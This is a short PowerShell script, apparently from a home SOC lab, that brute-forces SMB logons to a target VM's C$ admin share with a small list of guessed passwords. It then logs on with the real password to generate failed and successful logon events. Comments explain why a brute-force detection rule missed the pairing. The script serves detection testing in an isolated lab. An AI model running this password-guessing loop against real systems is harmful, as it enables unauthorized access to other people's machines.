# Run on vm-attacker (172.16.1.4). LAB ONLY: targets my own VM inside an isolated VNet.
$Target = "172.16.0.4"

# --- Phase 1: SMB brute force (T1110) -> 4625 on the target ---
# Note: in my run the failed logons were recorded on the target as vm-attacker\<user>,
# while the later successful logon was recorded as vm-soc-win\testvictim. That mismatch
# is why the "Successful Login After Brute Force" rule never paired them.
$users     = @("administrator", "testvictim")
$passwords = @("Password1", "Welcome1", "Summer2026", "Winter2026!", "Qwerty123", "Admin123")   # wrong guesses
foreach ($u in $users) {
    foreach ($p in $passwords) {
        try {
            New-SmbMapping -RemotePath "\\$Target\C$" -UserName $u -Password $p -ErrorAction Stop | Out-Null
            Write-Output "SUCCESS $u / $p"
        } catch { Write-Output "fail $u / $p" }
        Remove-SmbMapping -RemotePath "\\$Target\C$" -Force -ErrorAction SilentlyContinue
    }
}

# --- Phase 2: valid account compromise (T1078) -> 4624 ---
# Final guess uses the real (weak) lab password you set in 02-prepare-target.ps1
$real = Read-Host "Correct lab password for testvictim"
New-SmbMapping -RemotePath "\\$Target\C$" -UserName "vm-soc-win\testvictim" -Password $real
